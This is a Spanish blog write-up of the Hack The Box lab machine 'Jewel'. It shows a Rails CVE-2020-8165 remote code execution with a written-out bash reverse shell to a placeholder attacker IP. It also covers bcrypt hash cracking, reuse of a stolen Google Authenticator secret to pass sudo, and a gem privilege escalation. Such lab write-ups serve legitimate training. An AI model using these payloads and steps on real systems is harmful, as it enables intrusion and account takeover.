---
layout: post
title: Resolución de Jewel (WriteUp)
categories: WriteUp
---

Jewel es una máquina Linux de Hack The Box cuya dificultad es “Medium”. Las instrucciones que se utilizan en esta resolución tienen en cuenta que estamos trabajando en un entorno controlado. 

![Jewel 01]({{ site.baseurl }}/images/jewelhtb01.png)

### Resolución de Jewel (user.txt)

En primer lugar enumeramos los puertos abiertos:

![Jewel 02]({{ site.baseurl }}/images/jewelhtb02.png)

Para posteriormente realizar un análisis, a través de nmap, de los servicios disponibles en dichos puertos:

![Jewel 03]({{ site.baseurl }}/images/jewelhtb03.png)

Con este primer escaneo observamos que, además del servicio SSH a través del puerto 22, también tenemos dos servicios webs corriendo a través de los puertos 8000 y 8080. Con whatweb podemos obtener un primer acercamiento a cada una de estas webs:

![Jewel 04]({{ site.baseurl }}/images/jewelhtb04.png)

Entre nmap y whatweb ya vemos que a través del puerto 8000, en la ruta gitweb, tenemos un gitweb 2.20.1, mientras que a través del puerto 8080 tenemos un servidor de aplicaciones Phusion Passenger 6.0.6 que utiliza nginx 1.14.2.

En el puerto 8080 nos indican que el host se llama jewel.htb, por lo que introducimos esto en nuestro /etc/hosts. 

![Jewel 05]({{ site.baseurl }}/images/jewelhtb05.png)

Si entramos al servicio web del puerto 8000 vemos el proyecto git con una carpeta, .git. Dentro de esa carpeta nos permite realizar algunos comandos, como por ejemplo “grep” para buscar. Podemos aprovechar esto para buscar información sensible poniendo palabras claves como username, password… 

Si buscamos “pass” encontramos un archivos llamado bd.sql:

![Jewel 06]({{ site.baseurl }}/images/jewelhtb06.png)

Si buscamos en este archivo encontramos nombres de usuario, emails y contraseñas encriptadas:

![Jewel 07]({{ site.baseurl }}/images/jewelhtb07.png)

Los hashes obtenidos son de tipo bcrypt. 

Seguimos buscando información sensible, y por ejemplo tenemos el archivo Gemfile donde vienen las versiones de las herramientas que se están utilizando (en la web del puerto 8080). Entre estas herramientas y sus versiones nos quedamos con la información de que se utiliza rails en su versión 5.2.2.1. 

![Jewel 08]({{ site.baseurl }}/images/jewelhtb08.png)

Entre las diferentes vulnerabilidades existentes nos vamos a quedar con la CVE-2020-8165 que nos proporciona un Remote Code Execution (RCE):

![Jewel 09]({{ site.baseurl }}/images/jewelhtb09.png)

Si buscamos sobre esta vulnerabilidad encontraremos un [repositorio de GitHub](https://github.com/masahiro331/CVE-2020-8165) donde se explota, por lo que vamos a seguirlo. 

Del código vamos a modificar un par de cosas del Gemfile. Una será la versión de Ruby, que indicaremos la versión que nosotros tenemos instalado (se puede ver con “ruby -v”). Y otra será completar la línea de gem ‘sqlite3’ para evitar errores al cargar esta herramienta.

![Jewel 10]({{ site.baseurl }}/images/jewelhtb10.png)

Ahora continuamos con las instrucciones del GitHub. Primero con:

    bundle install --path vendor/bundle

Si tenemos problemas con esta instrucción quizás debamos instalar la versión de bundler correspondiente, que se haría de la siguiente manera:
    
    sudo gem install bundler:1.17.3

Y también algunos elementos como libsqlite3-dev:

    sudo apt install libsqlite3-dev

Si todo sale bien deberemos obtener un resultado final como este:

![Jewel 11]({{ site.baseurl }}/images/jewelhtb11.png)

Y seguimos con la siguiente instrucción:

    bundle exec rails db:migrate

![Jewel 12]({{ site.baseurl }}/images/jewelhtb12.png)

Ahora pasamos a la sección del exploit y arrancamos la consola con:

    bundle exec rails console

Y seguimos con el resto de instrucciones modificando el código que vamos a ejecutar remotamente por una shell reversa de la siguiente forma:

    code = '`/bin/bash -c “bash -i >& /dev/tcp/IP_ATACANTE/PUERTO 0>&1”`'

Esto nos devolverá el payload que debemos utilizar:

![Jewel 13]({{ site.baseurl }}/images/jewelhtb13.png)

Para hacer uso de ello primero tenemos que ir a la página web (jewel.htb:8080) y registrarnos. Una vez registrados nos logueamos con el email y la contraseña que acabamos de crear. Una vez dentro nos vamos a nuestro perfil (Profile) y le damos al botón “Profile” para editar nuestros datos de usuario. Como podemos observar en el código de la web la edición se realiza a través de un método POST:

![Jewel 14]({{ site.baseurl }}/images/jewelhtb14.png)

Por lo que nuestro objetivo será interceptar esta petición para inyectarle nuestro payload. Para ello vamos a utilizar Burp Suite. 

Así que con el Burp Suite arrancado y en escucha, activamos el proxy en el navegador, modificamos el nombre de usuario y pulsamos sobre “Update User” para interceptar la comunicación en el Burp Suite:

![Jewel 15]({{ site.baseurl }}/images/jewelhtb15.png)

Una vez tengamos la comunicación interceptada la enviamos al Repeater:

![Jewel 16]({{ site.baseurl }}/images/jewelhtb16.png)

Vamos arrancando el netcat a la escucha del puerto que indicamos en la generación del payload, recordamos:

    nc -nlvp PUERTO

Volviendo al Burp Suite, apagamos la intercepción en la pestaña Proxy y modificamos en el Repeater el nombre de usuario por el Payload. Enviamos (Send) la petición y nos debe aparecer algo como esto, es decir, “500 Internal Server Error”:

![Jewel 17]({{ site.baseurl }}/images/jewelhtb17.png)

Si tardamos en realizar este proceso puede haber problemas y que no funcione, no pasa nada, se vuelve a intentar. Si todo sale bien podemos volver al navegador y comprobar que indica en verde “Your account was updated correctly”, si aparece eso es cuestión de actualizar la página para forzar la ejecución del payload y que el servidor se conecte a nuestro netcat a la escucha:

![Jewel 18]({{ site.baseurl }}/images/jewelhtb18.png)

### Resolución de Jewel (root.txt)

Una vez dentro debemos buscar como escalar privilegios, para ello podemos usar herramientas automatizadas como LinPEAS o LinEnum. Con LinEnum encontramos una carpeta interesante, que es /var/backups. 

![Jewel 19]({{ site.baseurl }}/images/jewelhtb19.png)

En esta carpeta no podemos entrar a las copias de seguridad de shadow, pero sí que vemos que hay un fichero llamado dump_2020-08-27.sql que contiene, nuevamente, un par de hashes bcrypt diferentes a los que ya teníamos:

![Jewel 20]({{ site.baseurl }}/images/jewelhtb20.png)

Con lo cual, ya disponemos de 4 hashes bcrypt diferentes. Para proceder a intentar desencriptarlo podemos usar hashcat, buscando el código correspondiente a bcrypt:

![Jewel 21]({{ site.baseurl }}/images/jewelhtb21.png)

Para ello tendremos los 4 hashes en el fichero pass.hash y utilizaremos el diccionario rockyou.txt:

![Jewel 22]({{ site.baseurl }}/images/jewelhtb22.png)

Inmediatamente podemos comprobar que consigue desencriptar uno de los hashes, el cual está relacionado con el usuario bill:

![Jewel 23]({{ site.baseurl }}/images/jewelhtb23.png)

Pero si utilizamos esta clave para utilizar sudo con el usuario bill vemos que nos piden un código de verificación. La idea es obtener “sudo -l” para comprobar las acciones permitidas como superusuario para bill:

![Jewel 24]({{ site.baseurl }}/images/jewelhtb24.png)

Anteriormente, en la carpeta de bill, pudimos observar que había un fichero .google_authenticator:

![Jewel 25]({{ site.baseurl }}/images/jewelhtb25.png)

Por lo que haremos uso de ese fichero para obtener el código de verificación. Para ello instalamos en Firefox el plugin Authenticator de mymindstorm. Del servidor copiamos la clave del fichero google_authenticator:

![Jewel 26]({{ site.baseurl }}/images/jewelhtb26.png)

Creamos una nueva entrada en el plugin de forma manual y le introducimos la clave copiada:

![Jewel 27]({{ site.baseurl }}/images/jewelhtb27.png)

Pero vemos que nos da un error diferente, que no es el mismo al error de introducir un código incorrecto:

![Jewel 28]({{ site.baseurl }}/images/jewelhtb28.png)

Este error se debe a la zona horaria. El código de un solo uso lo generamos en una zona horaria de Madrid y lo introducimos en una zona horario de Londres, por lo que tenemos que cambiar esto para que se genere en la misma zona horario en la que se utilice.

![Jewel 29]({{ site.baseurl }}/images/jewelhtb29.png)

Primero cambiamos la zona horario con el comando:

    sudo timedatectl set-timezone Europe/London

Luego comprobamos los horarios y vemos que la hora del servidor no está bien puesta, por lo que tenemos que igualar también la hora. Para ello, utilizamos el comando:

    sudo date --set XX:XX:XX

donde las XX representa la hora actual según el servidor, dicha información se puede obtener usando el comando timedatectl.

![Jewel 30]({{ site.baseurl }}/images/jewelhtb30.png)

Con este cambio ya sí podemos usar “sudo” con el usuario bill usando nuestro código de un solo uso y la contraseña:

![Jewel 31]({{ site.baseurl }}/images/jewelhtb31.png)

Con esto ya vemos la información que queríamos, y es que podemos utilizar “gem” con permisos de root desde bill. Esta información podemos utilizarla para escalar privilegios de la forma que se indica en el siguiente enlace: [https://gtfobins.github.io/gtfobins/gem/](https://gtfobins.github.io/gtfobins/gem/]

Y así ya tendremos una shell como root y podremos ver la flag correspondiente:

![Jewel 32]({{ site.baseurl }}/images/jewelhtb32.png)

